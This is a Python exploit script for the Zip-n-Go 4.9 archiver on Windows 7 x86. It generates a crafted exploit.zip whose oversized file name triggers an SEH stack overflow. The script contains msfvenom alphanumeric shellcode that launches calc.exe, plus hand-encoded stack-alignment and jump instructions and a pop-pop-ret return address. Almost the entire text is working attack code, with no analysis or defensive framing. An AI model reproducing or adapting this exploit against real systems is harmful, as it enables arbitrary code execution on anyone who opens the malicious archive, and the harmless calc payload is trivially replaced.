print ("[*]Exploit Zip-n-Go 4.9")
print("[*]Developed by l3x4overflow")
print ("Windows 7 x86")

def createFile(filename, text):
    newFile = open(filename, "w")
    newFile.write(text)
    newFile.close()

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" #LOCAL FILE HEADER
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" #CENTRAL DIRECTORY FILE HEADER
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" #END OF CENTRAL DIRECTORY RECORD
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print("[*]Crafting zip exploit...")

filename = "exploit.zip"
size = 4064
nseh_offset = 3908
stack_align_offset = 84
shell_addr_offset = 192
shell_offset = 1896

# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe -e x86/alpha_mixed BufferRegister=EAX -f python -v shellcode

shellcode =  ""
shellcode += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x59\x6c\x49\x78\x4d\x52\x43\x30"
shellcode += "\x47\x70\x63\x30\x53\x50\x6d\x59\x69\x75\x34\x71"
shellcode += "\x69\x50\x31\x74\x6c\x4b\x56\x30\x70\x30\x6e\x6b"
shellcode += "\x61\x42\x66\x6c\x6e\x6b\x56\x32\x47\x64\x6e\x6b"
shellcode += "\x31\x62\x44\x68\x36\x6f\x6c\x77\x63\x7a\x34\x66"
shellcode += "\x30\x31\x4b\x4f\x6c\x6c\x45\x6c\x30\x61\x33\x4c"
shellcode += "\x75\x52\x76\x4c\x75\x70\x4b\x71\x68\x4f\x66\x6d"
shellcode += "\x67\x71\x78\x47\x6a\x42\x5a\x52\x32\x72\x36\x37"
shellcode += "\x4c\x4b\x70\x52\x56\x70\x4c\x4b\x30\x4a\x65\x6c"
shellcode += "\x6c\x4b\x42\x6c\x56\x71\x74\x38\x4a\x43\x73\x78"
shellcode += "\x73\x31\x5a\x71\x36\x31\x6e\x6b\x61\x49\x51\x30"
shellcode += "\x47\x71\x49\x43\x4e\x6b\x61\x59\x45\x48\x7a\x43"
shellcode += "\x47\x4a\x73\x79\x4e\x6b\x57\x44\x6e\x6b\x77\x71"
shellcode += "\x4b\x66\x75\x61\x6b\x4f\x6c\x6c\x6f\x31\x38\x4f"
shellcode += "\x64\x4d\x76\x61\x4b\x77\x36\x58\x6d\x30\x30\x75"
shellcode += "\x78\x76\x43\x33\x31\x6d\x4b\x48\x37\x4b\x33\x4d"
shellcode += "\x46\x44\x64\x35\x38\x64\x43\x68\x6e\x6b\x66\x38"
shellcode += "\x71\x34\x46\x61\x6e\x33\x33\x56\x4c\x4b\x46\x6c"
shellcode += "\x52\x6b\x4c\x4b\x30\x58\x45\x4c\x46\x61\x59\x43"
shellcode += "\x4c\x4b\x54\x44\x4c\x4b\x66\x61\x48\x50\x6e\x69"
shellcode += "\x31\x54\x76\x44\x44\x64\x53\x6b\x51\x4b\x61\x71"
shellcode += "\x30\x59\x53\x6a\x70\x51\x59\x6f\x79\x70\x33\x6f"
shellcode += "\x63\x6f\x71\x4a\x6e\x6b\x77\x62\x68\x6b\x6c\x4d"
shellcode += "\x73\x6d\x72\x4a\x73\x31\x4e\x6d\x6c\x45\x48\x32"
shellcode += "\x67\x70\x45\x50\x67\x70\x50\x50\x31\x78\x66\x51"
shellcode += "\x4e\x6b\x62\x4f\x6e\x67\x59\x6f\x38\x55\x4f\x4b"
shellcode += "\x38\x70\x78\x35\x49\x32\x46\x36\x70\x68\x6f\x56"
shellcode += "\x4d\x45\x6f\x4d\x4f\x6d\x49\x6f\x78\x55\x35\x6c"
shellcode += "\x55\x56\x43\x4c\x54\x4a\x6d\x50\x69\x6b\x39\x70"
shellcode += "\x63\x45\x36\x65\x4d\x6b\x70\x47\x52\x33\x52\x52"
shellcode += "\x52\x4f\x31\x7a\x57\x70\x52\x73\x6b\x4f\x59\x45"
shellcode += "\x62\x43\x65\x31\x42\x4c\x72\x43\x66\x4e\x45\x35"
shellcode += "\x61\x68\x52\x45\x73\x30\x41\x41"

#making eax point to our shellcode address
# push esp; pop eax; sub eax, 0x700; jmp eax;

shell_addr = "\x25\x01\x01\x01\x01"   # and eax,0x01010101
shell_addr += "\x25\x10\x10\x10\x10"   # and eax,0x10101010

# crafting \x90\x90\x90\xe0
shell_addr += "\x05\x70\x70\x70\x70" # add eax, 0x70707070
shell_addr += "\x05\x70\x20\x20\x20" # add eax, 0x20202070

shell_addr += "\x50" # push eax

shell_addr += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
shell_addr += "\x25\x10\x10\x10\x10"   # and eax,0x10101010

# crafting \xff\x00\x00\x07
shell_addr += "\x05\x03\x01\x01\x67" # add eax, 0x77010103
shell_addr += "\x05\x03\x01\x01\x67" # add eax, 0x77010103
shell_addr += "\x05\x02\x01\x01\x42" # add eax, 0x22010102
shell_addr += "\x2d\x01\x03\x03\x11" # sub eax, 0x11030301

shell_addr += "\x50" # push eax

shell_addr += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
shell_addr += "\x25\x10\x10\x10\x10"   # and eax,0x10101010

# crafting \x00\x2d\x58\x54
shell_addr += "\x05\x43\x47\x17\x11" # add eax, 0x11174743
shell_addr += "\x05\x12\x12\x17\x11" # add eax, 0x11171212
shell_addr += "\x2d\x01\x01\x01\x22" # sub eax, 0x22010101

shell_addr += "\x50" #push eax

#align the stack in a controlled area
#encoding and pushing to the stack a custom crafted jmp $-100 to start to write shellcode addr
# push esp; pop eax; add eax, 0x1C68; push eax; pop esp; jmp $-100

stack_align = "\x54" # push esp
stack_align += "\x58" # pop eax

# crafting add eax, 0x1C68 --> 7272
stack_align += "\x05\x69\x1d\x01\x01" # add eax, 0x01011d69
stack_align += "\x2d\x01\x01\x01\x01" # sub eax, 0x01010101

stack_align += "\x50" # push eax
stack_align += "\x5c"  # pop esp

# crafting jmp $-100 in reverse order (\x9a\eb) in eax and pushing it into the stack
stack_align += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
stack_align += "\x25\x10\x10\x10\x10"   # and eax,0x10101010

stack_align += "\x05\x7c\x5b\x01\x01" # add eax, 0x01015b7c
stack_align += "\x05\x70\x40\x01\x01" # add eax, 0x01014070
stack_align += "\x2d\x01\x01\x02\x02" # sub eax, 0x02020101

stack_align += "\x50" # push eax

payload = "A" * (nseh_offset - shell_offset)
payload += shellcode
payload += "A" * (nseh_offset - shell_addr_offset - len(payload))
payload += shell_addr
payload += "A" * (nseh_offset - stack_align_offset - len(payload))
payload += stack_align
payload += "A" *(nseh_offset - len(payload))
payload += "\x71\xa2\x70\xa2" # jo $-92 | jno $-92 ---> jump net
payload += "\x12\x69\x40\x00" # 0x00406912 --> pop pop ret
payload += "A" * (size - len(payload))
payload += ".txt"

exploit = header_1 + payload + header_2 + payload + header_3

createFile(filename, exploit)

print("[+]Zip exploit generated...")